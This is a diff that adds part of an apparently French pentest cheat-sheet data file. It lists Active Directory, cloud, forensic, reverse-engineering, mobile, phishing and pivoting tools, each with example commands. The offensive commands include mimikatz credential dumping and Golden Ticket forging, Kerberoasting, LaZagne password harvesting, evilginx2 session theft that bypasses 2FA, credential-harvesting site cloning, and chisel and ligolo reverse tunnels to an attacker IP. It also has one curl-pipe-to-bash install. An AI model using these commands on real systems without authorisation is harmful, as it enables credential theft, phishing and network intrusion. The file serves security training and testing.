+   {d:"Extraire les identifiants en mémoire",c:"sekurlsa::logonpasswords"},
+   {d:"Dump des hash depuis la SAM",c:"lsadump::sam"},
+   {d:"DCSync d'un compte",c:"lsadump::dcsync /user:corp\\krbtgt"},
+   {d:"Pass-the-hash",c:"sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLMHASH"},
+   {d:"Lister / exporter les tickets Kerberos",c:"sekurlsa::tickets /export"},
+   {d:"Forger un Golden Ticket",c:"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"}]},
+ {n:"rubeus",c:"ad",std:0,inst:"git clone https://github.com/GhostPack/Rubeus",r:"L'outil Kerberos pour Windows : roasting, pass-the-ticket, abus de délégation.",cmds:[
+   {d:"Kerberoasting",c:"Rubeus.exe kerberoast /outfile:hashes.txt"},
+   {d:"AS-REP Roasting",c:"Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"},
+   {d:"Demander un TGT",c:"Rubeus.exe asktgt /user:admin /rc4:NTLMHASH"},
+   {d:"Pass-the-ticket",c:"Rubeus.exe ptt /ticket:ticket.kirbi"},
+   {d:"Récolter les tickets",c:"Rubeus.exe harvest /interval:30"},
+   {d:"Overpass-the-hash",c:"Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt"}]},
+ {n:"ldapdomaindump",c:"ad",std:0,inst:"pipx install ldapdomaindump",r:"Vide tout l'annuaire AD en fichiers HTML/JSON lisibles d'un coup.",cmds:[
+   {d:"Dump complet du domaine",c:"ldapdomaindump -u 'corp\\user' -p pass DC_IP"},
+   {d:"Résoudre les adresses (grep-able)",c:"ldapdomaindump -u 'corp\\user' -p pass -r DC_IP -o loot/"},
+   {d:"Via LDAPS",c:"ldapdomaindump ldaps://DC_IP -u 'corp\\user' -p pass"}]},
+ {n:"sprayhound",c:"ad",std:0,inst:"pipx install sprayhound",r:"Password spraying prudent qui respecte la politique de lockout et marque les comptes dans BloodHound.",cmds:[
+   {d:"Spray avec un mot de passe",c:"sprayhound -d corp.local -U users.txt -p 'Hiver2025!' -dc DC_IP"},
+   {d:"Tester le mot de passe = login",c:"sprayhound -d corp.local -U users.txt --lower -dc DC_IP"},
+   {d:"Remonter les résultats dans BloodHound",c:"sprayhound -d corp.local -U users.txt -p pass -dc DC_IP -nh NEO4J_IP -nu neo4j -np pass"}]},
+ {n:"pywerview",c:"ad",std:0,inst:"pipx install pywerview",r:"Le portage Python de PowerView : énumération AD depuis Linux sans toucher à PowerShell.",cmds:[
+   {d:"Lister les utilisateurs",c:"pywerview get-netuser -w corp.local -u user -p pass --dc-ip DC_IP"},
+   {d:"Lister les machines",c:"pywerview get-netcomputer -w corp.local -u user -p pass --dc-ip DC_IP"},
+   {d:"Trouver les comptes kerberoastables",c:"pywerview get-netuser -w corp.local -u user -p pass --dc-ip DC_IP --spn"},
+   {d:"Lister les groupes d'un utilisateur",c:"pywerview get-netgroup -w corp.local -u user -p pass --dc-ip DC_IP --username admin"}]},
+ {n:"coercer",c:"ad",std:0,inst:"pipx install coercer",r:"Force un serveur Windows à s'authentifier vers vous (PetitPotam, PrinterBug…) pour le relayer.",cmds:[
+   {d:"Coercition automatique",c:"coercer coerce -u user -p pass -d corp.local -t CIBLE -l VOTRE_IP"},
+   {d:"Scanner les méthodes vulnérables",c:"coercer scan -u user -p pass -d corp.local -t CIBLE"},
+   {d:"Via une méthode précise",c:"coercer coerce -u user -p pass -d corp.local -t CIBLE -l VOTRE_IP --filter-method-name PetitPotam"}]},
+ {n:"prowler",c:"cloud",std:0,inst:"pipx install prowler",r:"Audit de sécurité et de conformité pour AWS, Azure et GCP en centaines de contrôles.",cmds:[
+   {d:"Audit complet AWS",c:"prowler aws"},
+   {d:"Un profil et une région",c:"prowler aws -p monprofil -f eu-west-3"},
+   {d:"Benchmark CIS",c:"prowler aws --compliance cis_2.0_aws"},
+   {d:"Un seul contrôle",c:"prowler aws -c s3_bucket_public_access"},
+   {d:"Audit Azure",c:"prowler azure --az-cli-auth"},
+   {d:"Audit GCP",c:"prowler gcp"},
+   {d:"Rapport HTML/JSON",c:"prowler aws -M html json-ocsf"}]},
+ {n:"scoutsuite",c:"cloud",std:0,inst:"pipx install scoutsuite",r:"Audit multi-cloud qui produit un rapport HTML visuel de la posture de sécurité.",cmds:[
+   {d:"Audit AWS",c:"scout aws"},
+   {d:"Profil AWS précis",c:"scout aws --profile monprofil"},
+   {d:"Audit Azure (CLI)",c:"scout azure --cli"},
+   {d:"Audit GCP",c:"scout gcp --user-account"},
+   {d:"Limiter aux services choisis",c:"scout aws --services s3 iam ec2"}]},
+ {n:"pacu",c:"cloud",std:0,inst:"pipx install pacu",r:"Le framework d'exploitation offensive d'AWS : l'équivalent Metasploit du cloud Amazon.",cmds:[
+   {d:"Lancer le framework",c:"pacu"},
+   {d:"Importer des clés AWS",c:"import_keys --all"},
+   {d:"Chercher un module",c:"search iam"},
+   {d:"Énumérer les permissions",c:"run iam__enum_permissions"},
+   {d:"Chercher une élévation de privilèges",c:"run iam__privesc_scan"},
+   {d:"Lister les ressources",c:"run aws__enum_account"}]},
+ {n:"trivy",c:"cloud",std:0,inst:"sudo apt install trivy",r:"Scanner de vulnérabilités tout-terrain : images Docker, filesystems, IaC, dépôts git.",cmds:[
+   {d:"Scanner une image Docker",c:"trivy image nginx:latest"},
+   {d:"Seulement les failles critiques",c:"trivy image --severity CRITICAL,HIGH nginx:latest"},
+   {d:"Scanner un système de fichiers",c:"trivy fs /chemin/projet"},
+   {d:"Scanner un dépôt git",c:"trivy repo https://github.com/org/repo"},
+   {d:"Scanner de l'IaC (Terraform…)",c:"trivy config ./terraform"},
+   {d:"Détecter des secrets",c:"trivy fs --scanners secret ."},
+   {d:"Scanner un cluster Kubernetes",c:"trivy k8s --report summary cluster"}]},
+ {n:"kube-hunter",c:"cloud",std:0,inst:"pipx install kube-hunter",r:"Chasse les faiblesses de sécurité d'un cluster Kubernetes, de l'extérieur comme de l'intérieur.",cmds:[
+   {d:"Scan distant d'une IP",c:"kube-hunter --remote CIBLE"},
+   {d:"Scanner le réseau local",c:"kube-hunter --cidr 192.168.1.0/24"},
+   {d:"Scan interne (depuis un pod)",c:"kube-hunter --pod"},
+   {d:"Mode actif (tests intrusifs)",c:"kube-hunter --remote CIBLE --active"},
+   {d:"Rapport JSON",c:"kube-hunter --remote CIBLE --report json"}]},
+ {n:"kube-bench",c:"cloud",std:0,inst:"go install github.com/aquasecurity/kube-bench@latest",r:"Vérifie qu'un cluster Kubernetes respecte le benchmark de durcissement CIS.",cmds:[
+   {d:"Lancer tous les contrôles",c:"kube-bench"},
+   {d:"Contrôles du nœud master",c:"kube-bench run --targets master"},
+   {d:"Contrôles des workers",c:"kube-bench run --targets node"},
+   {d:"Version de benchmark précise",c:"kube-bench --benchmark cis-1.8"},
+   {d:"Sortie JSON",c:"kube-bench --json"}]},
+ {n:"cloudfox",c:"cloud",std:0,inst:"go install github.com/BishopFox/cloudfox@latest",r:"Dresse la carte offensive d'un environnement cloud et pointe les chemins d'attaque.",cmds:[
+   {d:"Tout énumérer sur AWS",c:"cloudfox aws --profile monprofil all-checks"},
+   {d:"Lister les IP/ports exposés",c:"cloudfox aws --profile monprofil inventory"},
+   {d:"Trouver les secrets dans les instances",c:"cloudfox aws --profile monprofil endpoints"},
+   {d:"Chercher les permissions sensibles",c:"cloudfox aws --profile monprofil permissions"},
+   {d:"Équivalent Azure",c:"cloudfox azure --tenant TENANT_ID all-checks"}]},
+ {n:"binwalk",c:"forensic",std:1,inst:"sudo apt install binwalk",r:"Fouille et extrait les fichiers cachés dans les firmwares et images binaires.",cmds:[
+   {d:"Analyser un firmware",c:"binwalk firmware.bin"},
+   {d:"Extraire les fichiers intégrés",c:"binwalk -e firmware.bin"},
+   {d:"Extraction récursive",c:"binwalk -Me firmware.bin"},
+   {d:"Analyse d'entropie (chiffrement)",c:"binwalk -E firmware.bin"},
+   {d:"Chercher une signature précise",c:"binwalk -R '\\x1f\\x8b\\x08' firmware.bin"},
+   {d:"Scan d'opcodes",c:"binwalk -A firmware.bin"}]},
+ {n:"foremost",c:"forensic",std:1,inst:"sudo apt install foremost",r:"Récupère des fichiers par leurs signatures (file carving) dans une image disque.",cmds:[
+   {d:"Carving d'une image disque",c:"foremost -i image.dd -o output/"},
+   {d:"Types de fichiers précis",c:"foremost -t jpg,pdf,doc -i image.dd -o output/"},
+   {d:"Mode verbeux",c:"foremost -v -i image.dd -o output/"},
+   {d:"Tous les types connus",c:"foremost -t all -i disk.img -o recovered/"}]},
+ {n:"scalpel",c:"forensic",std:0,inst:"sudo apt install scalpel",r:"File carver performant et configurable, descendant de foremost.",cmds:[
+   {d:"Carving d'une image",c:"scalpel -o output/ image.dd"},
+   {d:"Avec un fichier de config",c:"scalpel -c /etc/scalpel/scalpel.conf -o output/ image.dd"},
+   {d:"Éditer les types recherchés",c:"sudo nano /etc/scalpel/scalpel.conf"}]},
+ {n:"volatility3",c:"forensic",std:0,inst:"pipx install volatility3",r:"Le framework d'analyse de mémoire RAM : processus, connexions, injections, secrets.",cmds:[
+   {d:"Lister les processus",c:"vol -f memory.raw windows.pslist"},
+   {d:"Arborescence des processus",c:"vol -f memory.raw windows.pstree"},
+   {d:"Processus cachés",c:"vol -f memory.raw windows.psscan"},
+   {d:"Connexions réseau",c:"vol -f memory.raw windows.netscan"},
+   {d:"Lignes de commande",c:"vol -f memory.raw windows.cmdline"},
+   {d:"Extraire les hash SAM",c:"vol -f memory.raw windows.hashdump"},
+   {d:"Détecter des injections de code",c:"vol -f memory.raw windows.malfind"},
+   {d:"Dumper un processus",c:"vol -f memory.raw -o /tmp windows.dumpfiles --pid 1234"},
+   {d:"Ruches de registre",c:"vol -f memory.raw windows.registry.hivelist"},
+   {d:"Analyse Linux",c:"vol -f memory.raw linux.pslist"}]},
+ {n:"autopsy",c:"forensic",std:1,inst:"sudo apt install autopsy",r:"La plateforme graphique d'investigation disque (front-end de Sleuth Kit).",cmds:[
+   {d:"Lancer le serveur web",c:"sudo autopsy"},
+   {d:"Ouvrir l'interface",c:"http://localhost:9999/autopsy"},
+   {d:"Créer un cas et ajouter une image",c:"New Case → Add Host → Add Image File"}]},
+ {n:"sleuthkit",c:"forensic",std:1,inst:"sudo apt install sleuthkit",r:"La suite d'outils en ligne de commande pour disséquer systèmes de fichiers et images disque.",cmds:[
+   {d:"Lister les partitions",c:"mmls image.dd"},
+   {d:"Détails du système de fichiers",c:"fsstat -o 2048 image.dd"},
+   {d:"Lister les fichiers (dont supprimés)",c:"fls -r -o 2048 image.dd"},
+   {d:"Extraire un fichier par inode",c:"icat -o 2048 image.dd 12345 > fichier"},
+   {d:"Chronologie des fichiers (timeline)",c:"fls -r -m / -o 2048 image.dd > body.txt && mactime -b body.txt"}]},
+ {n:"exiftool",c:"forensic",std:1,inst:"sudo apt install libimage-exiftool-perl",r:"Lit et modifie les métadonnées de presque tous les formats de fichiers.",cmds:[
+   {d:"Afficher toutes les métadonnées",c:"exiftool photo.jpg"},
+   {d:"Coordonnées GPS",c:"exiftool -gps:all photo.jpg"},
+   {d:"Traiter un dossier entier",c:"exiftool -r /chemin/photos/"},
+   {d:"Effacer toutes les métadonnées",c:"exiftool -all= photo.jpg"},
+   {d:"Extraire en CSV",c:"exiftool -csv -r /chemin/ > meta.csv"},
+   {d:"Afficher un champ précis",c:"exiftool -Author -CreateDate document.pdf"}]},
+ {n:"bulk-extractor",c:"forensic",std:0,inst:"sudo apt install bulk-extractor",r:"Scanne une image disque pour en extraire e-mails, cartes bancaires, URLs et autres indices.",cmds:[
+   {d:"Extraction complète",c:"bulk_extractor -o output/ image.dd"},
+   {d:"Scanner une capture réseau",c:"bulk_extractor -o output/ capture.pcap"},
+   {d:"Consulter les e-mails trouvés",c:"cat output/email.txt"},
+   {d:"Désactiver un scanner",c:"bulk_extractor -x aes -o output/ image.dd"}]},
+ {n:"steghide",c:"forensic",std:1,inst:"sudo apt install steghide",r:"Cache et extrait des données dans des images et fichiers audio (stéganographie).",cmds:[
+   {d:"Cacher un fichier dans une image",c:"steghide embed -cf image.jpg -ef secret.txt"},
+   {d:"Extraire les données cachées",c:"steghide extract -sf image.jpg"},
+   {d:"Afficher les infos d'un fichier",c:"steghide info image.jpg"},
+   {d:"Avec passphrase en ligne",c:"steghide extract -sf image.jpg -p motdepasse"}]},
+ {n:"stegsnow",c:"forensic",std:1,inst:"sudo apt install stegsnow",r:"Dissimule des messages dans les espaces et tabulations en fin de ligne d'un texte.",cmds:[
+   {d:"Cacher un message",c:"stegsnow -C -m 'message secret' -p cle cover.txt out.txt"},
+   {d:"Extraire le message",c:"stegsnow -C -p cle out.txt"}]},
+ {n:"zsteg",c:"forensic",std:0,inst:"gem install zsteg",r:"Détecte les données cachées dans les images PNG et BMP (LSB, canaux…).",cmds:[
+   {d:"Analyser une image",c:"zsteg image.png"},
+   {d:"Tout tester, en détail",c:"zsteg -a image.png"},
+   {d:"Extraire un flux précis",c:"zsteg -E 'b1,rgb,lsb,xy' image.png > out.bin"}]},
+ {n:"testdisk",c:"forensic",std:1,inst:"sudo apt install testdisk",r:"Répare les tables de partition et récupère les volumes perdus.",cmds:[
+   {d:"Lancer l'outil interactif",c:"sudo testdisk"},
+   {d:"Analyser une image disque",c:"sudo testdisk image.dd"},
+   {d:"Créer un journal des opérations",c:"sudo testdisk /log"}]},
+ {n:"photorec",c:"forensic",std:1,inst:"sudo apt install testdisk",r:"Récupère les fichiers effacés par signature, même sans table de partition.",cmds:[
+   {d:"Lancer la récupération",c:"sudo photorec"},
+   {d:"Depuis une image disque",c:"sudo photorec image.dd"},
+   {d:"Récupération non interactive",c:"sudo photorec /d output/ /cmd image.dd search"}]},
+ {n:"LaZagne",c:"forensic",std:0,inst:"git clone https://github.com/AlessandroZ/LaZagne",r:"Récupère en masse les mots de passe stockés en local (navigateurs, WiFi, mails…).",cmds:[
+   {d:"Tout récupérer",c:"lazagne all"},
+   {d:"Seulement les navigateurs",c:"lazagne browsers"},
+   {d:"Exporter en JSON",c:"lazagne all -oJ"},
+   {d:"Version Windows",c:"lazagne.exe all"}]},
+ {n:"ghidra",c:"reverse",std:0,inst:"sudo apt install ghidra",r:"La suite de rétro-ingénierie de la NSA : désassembleur et décompilateur multi-architectures.",cmds:[
+   {d:"Lancer l'interface graphique",c:"ghidra"},
+   {d:"Créer un projet et importer un binaire",c:"File → New Project → Import File"},
+   {d:"Lancer l'auto-analyse",c:"Analysis → Auto Analyze"},
+   {d:"Voir le code décompilé (fenêtre)",c:"Window → Decompiler"},
+   {d:"Analyse en mode headless",c:"analyzeHeadless /tmp projet -import binaire"}]},
+ {n:"radare2",c:"reverse",std:1,inst:"sudo apt install radare2",r:"Le framework de reverse en ligne de commande : analyse, debug, patch, le tout au clavier.",cmds:[
+   {d:"Ouvrir un binaire en écriture",c:"r2 -w binaire"},
+   {d:"Analyser tout le binaire",c:"aaa"},
+   {d:"Lister les fonctions",c:"afl"},
+   {d:"Désassembler la fonction main",c:"pdf @ main"},
+   {d:"Voir le graphe de flux (visuel)",c:"VV @ main"},
+   {d:"Chercher les chaînes",c:"iz"},
+   {d:"Poser un point d'arrêt (mode debug)",c:"db 0x08048500"},
+   {d:"Chercher une valeur en mémoire",c:"/ 0xdeadbeef"}]},
+ {n:"cutter",c:"reverse",std:0,inst:"sudo apt install cutter",r:"L'interface graphique de radare2/rizin : le reverse sans la ligne de commande.",cmds:[
+   {d:"Lancer l'application",c:"cutter"},
+   {d:"Ouvrir un binaire",c:"cutter binaire"},
+   {d:"Décompiler (si plugin Ghidra)",c:"onglet Decompiler"},
+   {d:"Vue graphe des fonctions",c:"barre d'espace sur une fonction"}]},
+ {n:"gdb",c:"reverse",std:1,inst:"sudo apt install gdb",r:"Le débogueur de référence sous Linux, indispensable pour l'exploitation binaire.",cmds:[
+   {d:"Charger un binaire",c:"gdb ./binaire"},
+   {d:"Poser un breakpoint sur main",c:"break main"},
+   {d:"Lancer avec des arguments",c:"run AAAA"},
+   {d:"Exécuter pas à pas (instruction)",c:"stepi"},
+   {d:"Examiner la pile en hexa",c:"x/40x $rsp"},
+   {d:"Voir les registres",c:"info registers"},
+   {d:"Désassembler une fonction",c:"disassemble main"},
+   {d:"Installer GEF (extension exploit)",c:"bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\""},
+   {d:"Trouver un motif cyclique (GEF)",c:"pattern create 200"}]},
+ {n:"objdump",c:"reverse",std:1,inst:"sudo apt install binutils",r:"Affiche le désassemblage et les en-têtes d'un binaire d'une seule commande.",cmds:[
+   {d:"Désassembler (syntaxe Intel)",c:"objdump -d -M intel binaire"},
+   {d:"En-têtes de sections",c:"objdump -h binaire"},
+   {d:"Table des symboles",c:"objdump -t binaire"},
+   {d:"Tout afficher",c:"objdump -x binaire"},
+   {d:"Données en lecture seule",c:"objdump -s -j .rodata binaire"}]},
+ {n:"checksec",c:"reverse",std:1,inst:"sudo apt install checksec",r:"Révèle les protections d'un binaire : NX, PIE, Canary, RELRO.",cmds:[
+   {d:"Vérifier un binaire",c:"checksec --file=binaire"},
+   {d:"Vérifier un processus",c:"checksec --pid=1234"},
+   {d:"Scanner tout un dossier",c:"checksec --dir=/usr/bin"},
+   {d:"Sortie JSON",c:"checksec --file=binaire --format=json"}]},
+ {n:"ropper",c:"reverse",std:0,inst:"pipx install ropper",r:"Déniche les gadgets ROP et aide à construire les chaînes d'exploitation.",cmds:[
+   {d:"Lister tous les gadgets",c:"ropper -f binaire"},
+   {d:"Chercher un gadget précis",c:"ropper -f binaire --search 'pop rdi'"},
+   {d:"Gadgets JOP",c:"ropper -f binaire --jmp rax"},
+   {d:"Trouver les chaînes et adresses",c:"ropper -f binaire --string '/bin/sh'"},
+   {d:"Générer une ropchain execve",c:"ropper -f binaire --chain execve"}]},
+ {n:"ROPgadget",c:"reverse",std:1,inst:"pipx install ROPgadget",r:"Scanne un binaire à la recherche de gadgets ROP exploitables.",cmds:[
+   {d:"Lister les gadgets",c:"ROPgadget --binary binaire"},
+   {d:"Filtrer sur un motif",c:"ROPgadget --binary binaire --only 'pop|ret'"},
+   {d:"Chercher une chaîne",c:"ROPgadget --binary binaire --string '/bin/sh'"},
+   {d:"Générer une ropchain automatique",c:"ROPgadget --binary binaire --ropchain"}]},
+ {n:"pwntools",c:"reverse",std:0,inst:"pipx install pwntools",r:"La bibliothèque Python qui industrialise l'écriture d'exploits binaires et réseau.",cmds:[
+   {d:"Créer un template d'exploit",c:"pwn template ./binaire > exploit.py"},
+   {d:"Se connecter à un service",c:"r = remote('CIBLE', 1337)"},
+   {d:"Lancer un process local",c:"p = process('./binaire')"},
+   {d:"Créer un motif cyclique",c:"cyclic 200"},
+   {d:"Empaqueter une adresse (64 bits)",c:"payload = b'A'*72 + p64(0xdeadbeef)"},
+   {d:"Trouver un décalage (offset)",c:"cyclic_find(0x6161616c)"},
+   {d:"Récupérer un shell interactif",c:"r.interactive()"},
+   {d:"Infos sur la libc / ELF",c:"pwn checksec ./binaire"}]},
+ {n:"strings",c:"reverse",std:1,inst:"sudo apt install binutils",r:"Extrait les chaînes de caractères lisibles d'un binaire — premier réflexe du reverse.",cmds:[
+   {d:"Extraire les chaînes",c:"strings binaire"},
+   {d:"Longueur minimale",c:"strings -n 8 binaire"},
+   {d:"Avec l'offset",c:"strings -t x binaire"},
+   {d:"Chercher un indice (flag, mot de passe)",c:"strings binaire | grep -i -E 'flag|pass|key'"}]},
+ {n:"ltrace",c:"reverse",std:1,inst:"sudo apt install ltrace",r:"Trace les appels aux fonctions de bibliothèque d'un programme à l'exécution.",cmds:[
+   {d:"Tracer un programme",c:"ltrace ./binaire"},
+   {d:"Afficher les temps",c:"ltrace -T ./binaire"},
+   {d:"Suivre les processus fils",c:"ltrace -f ./binaire"},
+   {d:"Filtrer sur une fonction",c:"ltrace -e strcmp ./binaire"}]},
+ {n:"strace",c:"reverse",std:1,inst:"sudo apt install strace",r:"Trace les appels système d'un programme : fichiers, réseau, mémoire.",cmds:[
+   {d:"Tracer un programme",c:"strace ./binaire"},
+   {d:"S'attacher à un processus",c:"strace -p 1234"},
+   {d:"Suivre les fils",c:"strace -f ./binaire"},
+   {d:"Seulement les accès fichiers",c:"strace -e trace=open,read,write ./binaire"},
+   {d:"Statistiques des appels",c:"strace -c ./binaire"}]},
+ {n:"angr",c:"reverse",std:0,inst:"pipx install angr",r:"Moteur d'exécution symbolique qui résout automatiquement crackmes et contraintes.",cmds:[
+   {d:"Charger un binaire (Python)",c:"proj = angr.Project('./binaire')"},
+   {d:"Créer un état initial",c:"state = proj.factory.entry_state()"},
+   {d:"Explorer vers une adresse cible",c:"sm.explore(find=0x400abc, avoid=0x400def)"},
+   {d:"Récupérer l'entrée gagnante",c:"print(sm.found[0].posix.dumps(0))"}]},
+ {n:"upx",c:"reverse",std:1,inst:"sudo apt install upx-ucl",r:"Compresse (packe) et décompresse les exécutables — à repérer en reverse.",cmds:[
+   {d:"Décompresser un binaire packé",c:"upx -d binaire"},
+   {d:"Compresser au maximum",c:"upx --best binaire"},
+   {d:"Tester un fichier packé",c:"upx -t binaire"},
+   {d:"Lister les infos",c:"upx -l binaire"}]},
+ {n:"pwninit",c:"reverse",std:0,inst:"cargo install pwninit",r:"Prépare un challenge de pwn : lie la bonne libc et génère un squelette d'exploit.",cmds:[
+   {d:"Initialiser le challenge (dossier courant)",c:"pwninit"},
+   {d:"Spécifier binaire et libc",c:"pwninit --bin ./chall --libc ./libc.so.6"},
+   {d:"Sans patcher le binaire",c:"pwninit --no-patch-bin"}]},
+ {n:"one_gadget",c:"reverse",std:0,inst:"gem install one_gadget",r:"Trouve dans une libc les 'gadgets magiques' qui donnent un shell en un saut.",cmds:[
+   {d:"Chercher les one-gadgets",c:"one_gadget /lib/x86_64-linux-gnu/libc.so.6"},
+   {d:"Format d'affichage brut",c:"one_gadget libc.so.6 --raw"},
+   {d:"Niveau de contraintes",c:"one_gadget libc.so.6 -l 2"}]},
+ {n:"apktool",c:"mobile",std:1,inst:"sudo apt install apktool",r:"Décompile et recompile les APK Android pour inspecter ressources et code smali.",cmds:[
+   {d:"Décompiler un APK",c:"apktool d app.apk -o app_src"},
+   {d:"Recompiler après modification",c:"apktool b app_src -o app_mod.apk"},
+   {d:"Garder les ressources brutes",c:"apktool d -r app.apk"},
+   {d:"Signer l'APK recompilé",c:"apksigner sign --ks ma.keystore app_mod.apk"},
+   {d:"Installer un framework",c:"apktool if framework-res.apk"}]},
+ {n:"jadx",c:"mobile",std:1,inst:"sudo apt install jadx",r:"Décompile un APK directement en code Java lisible — le reverse Android facile.",cmds:[
+   {d:"Décompiler en Java",c:"jadx app.apk -d sortie/"},
+   {d:"Interface graphique",c:"jadx-gui app.apk"},
+   {d:"Exporter aussi les ressources",c:"jadx -e app.apk -d sortie/"},
+   {d:"Deobfuscation des noms",c:"jadx --deobf app.apk -d sortie/"}]},
+ {n:"dex2jar",c:"mobile",std:1,inst:"sudo apt install dex2jar",r:"Convertit le bytecode Dalvik (.dex) en .jar lisible par les décompilateurs Java.",cmds:[
+   {d:"Convertir un APK en jar",c:"d2j-dex2jar app.apk -o app.jar"},
+   {d:"Convertir un .dex",c:"d2j-dex2jar classes.dex"},
+   {d:"Ouvrir le jar (jd-gui)",c:"jd-gui app.jar"}]},
+ {n:"frida",c:"mobile",std:0,inst:"pipx install frida-tools",r:"Instrumente les applications en direct : hooke les fonctions à chaud (Android/iOS/desktop).",cmds:[
+   {d:"Lister les processus du device",c:"frida-ps -U"},
+   {d:"S'attacher à une application",c:"frida -U -n com.appli.cible"},
+   {d:"Injecter un script au lancement",c:"frida -U -f com.appli.cible -l hook.js"},
+   {d:"Lister les apps installées",c:"frida-ps -Uai"},
+   {d:"Contourner le SSL pinning (script)",c:"frida -U -f com.appli.cible -l ssl-bypass.js"},
+   {d:"Tracer des fonctions",c:"frida-trace -U -i 'open*' com.appli.cible"}]},
+ {n:"objection",c:"mobile",std:0,inst:"pipx install objection",r:"Boîte à outils de pentest mobile bâtie sur Frida : sans rooter ni jailbreaker.",cmds:[
+   {d:"Explorer une application",c:"objection -g com.appli.cible explore"},
+   {d:"Contourner le SSL pinning",c:"android sslpinning disable"},
+   {d:"Contourner la détection de root",c:"android root disable"},
+   {d:"Lister les classes chargées",c:"android hooking list classes"},
+   {d:"Dumper le keystore",c:"android keystore list"}]},
+ {n:"MobSF",c:"mobile",std:0,inst:"git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF",r:"Plateforme d'analyse automatisée (statique + dynamique) pour apps Android et iOS.",cmds:[
+   {d:"Lancer via Docker",c:"docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf"},
+   {d:"Ouvrir l'interface",c:"http://localhost:8000"},
+   {d:"Lancer le serveur (install locale)",c:"./run.sh"},
+   {d:"Scanner via l'API",c:"curl -F 'file=@app.apk' http://localhost:8000/api/v1/upload -H 'Authorization:CLE'"}]},
+ {n:"drozer",c:"mobile",std:0,inst:"pipx install drozer",r:"Évalue la surface d'attaque des apps Android via leurs composants exportés (IPC).",cmds:[
+   {d:"Ouvrir une console",c:"drozer console connect"},
+   {d:"Lister les packages",c:"run app.package.list"},
+   {d:"Surface d'attaque d'une app",c:"run app.package.attacksurface com.appli.cible"},
+   {d:"Activités exportées",c:"run app.activity.info -a com.appli.cible"},
+   {d:"Interroger un content provider",c:"run app.provider.query content://com.appli.cible/data"}]},
+ {n:"SET",c:"social",std:1,inst:"sudo apt install set",r:"Le Social-Engineer Toolkit : forge campagnes de phishing, pages clonées et payloads.",cmds:[
+   {d:"Lancer le toolkit",c:"sudo setoolkit"},
+   {d:"Attaques d'ingénierie sociale",c:"1) Social-Engineering Attacks"},
+   {d:"Vecteurs d'attaque web",c:"2) Website Attack Vectors"},
+   {d:"Cloner un site (vol d'identifiants)",c:"3) Credential Harvester → 2) Site Cloner"},
+   {d:"Campagne de spear-phishing",c:"1) Spear-Phishing Attack Vectors"}]},
+ {n:"Gophish",c:"social",std:0,inst:"git clone https://github.com/gophish/gophish",r:"Framework de simulation de phishing clé en main, avec tableau de bord et suivi des clics.",cmds:[
+   {d:"Lancer le serveur",c:"./gophish"},
+   {d:"Interface d'administration",c:"https://localhost:3333"},
+   {d:"Récupérer le mot de passe admin",c:"grep -i password gophish.log"},
+   {d:"Workflow : créer une campagne",c:"Campaigns → New Campaign"}]},
+ {n:"evilginx2",c:"social",std:0,inst:"git clone https://github.com/kgretzky/evilginx2",r:"Reverse-proxy de phishing qui vole identifiants ET cookies de session (contourne la 2FA).",cmds:[
+   {d:"Lancer l'outil",c:"sudo ./evilginx"},
+   {d:"Définir le domaine",c:"config domain phish.example"},
+   {d:"Définir l'IP publique",c:"config ipv4 VOTRE_IP"},
+   {d:"Activer un phishlet",c:"phishlets enable o365"},
+   {d:"Générer un lien piégé",c:"lures create o365"},
+   {d:"Récupérer les sessions volées",c:"sessions"}]},
+ {n:"zphisher",c:"social",std:0,inst:"git clone https://github.com/htr-tech/zphisher",r:"Outil de phishing automatisé avec des dizaines de modèles de pages prêts à l'emploi.",cmds:[
+   {d:"Lancer l'outil",c:"bash zphisher.sh"},
+   {d:"Choisir un modèle",c:"sélectionner (ex. 01 Facebook)"},
+   {d:"Exposer via tunnel (Cloudflared)",c:"choisir l'option de tunnel à l'écran"}]},
+ {n:"proxychains4",c:"anon",std:1,inst:"sudo apt install proxychains4",r:"Force n'importe quel programme à passer par une chaîne de proxies (Tor, SOCKS…).",cmds:[
+   {d:"Lancer un outil via les proxies",c:"proxychains4 nmap -sT -Pn CIBLE"},
+   {d:"Navigation via Tor",c:"proxychains4 firefox"},
+   {d:"Éditer la configuration",c:"sudo nano /etc/proxychains4.conf"},
+   {d:"Pivoter via un SOCKS distant",c:"proxychains4 crackmapexec smb CIBLE -u user -p pass"},
+   {d:"Mode silencieux (quiet)",c:"proxychains4 -q curl http://CIBLE"}]},
+ {n:"tor",c:"anon",std:1,inst:"sudo apt install tor",r:"Le réseau d'anonymisation en oignon : fait transiter le trafic par trois relais chiffrés.",cmds:[
+   {d:"Démarrer le service",c:"sudo systemctl start tor"},
+   {d:"Proxy SOCKS local (par défaut)",c:"127.0.0.1:9050"},
+   {d:"Vérifier l'IP de sortie",c:"proxychains4 curl https://check.torproject.org/api/ip"},
+   {d:"Renouveler le circuit",c:"sudo systemctl reload tor"}]},
+ {n:"chisel",c:"anon",std:0,inst:"go install github.com/jpillora/chisel@latest",r:"Tunnel TCP/UDP rapide sur HTTP pour pivoter et faire du port-forwarding.",cmds:[
+   {d:"Lancer le serveur (attaquant)",c:"chisel server -p 8080 --reverse"},
+   {d:"Reverse SOCKS depuis la cible",c:"chisel client VOTRE_IP:8080 R:socks"},
+   {d:"Rediriger un port distant",c:"chisel client VOTRE_IP:8080 R:3389:127.0.0.1:3389"},
+   {d:"Forward local vers un service interne",c:"chisel client VOTRE_IP:8080 8000:interne:80"}]},
+ {n:"ligolo-ng",c:"anon",std:0,inst:"go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest",r:"Outil de pivot moderne qui monte une interface TUN : le réseau cible devient routable.",cmds:[
+   {d:"Lancer le proxy (attaquant)",c:"ligolo-ng -selfcert"},
+   {d:"Lancer l'agent sur la cible",c:"./agent -connect VOTRE_IP:11601 -ignore-cert"},
+   {d:"Créer l'interface tun",c:"sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up"},
+   {d:"Démarrer le tunnel (session)",c:"session; start"},
+   {d:"Ajouter la route vers le réseau interne",c:"sudo ip route add 10.10.10.0/24 dev ligolo"}]},
+ {n:"socat",c:"anon",std:1,inst:"sudo apt install socat",r:"Relais de flux universel : redirige, tunnelise et stabilise les connexions.",cmds:[
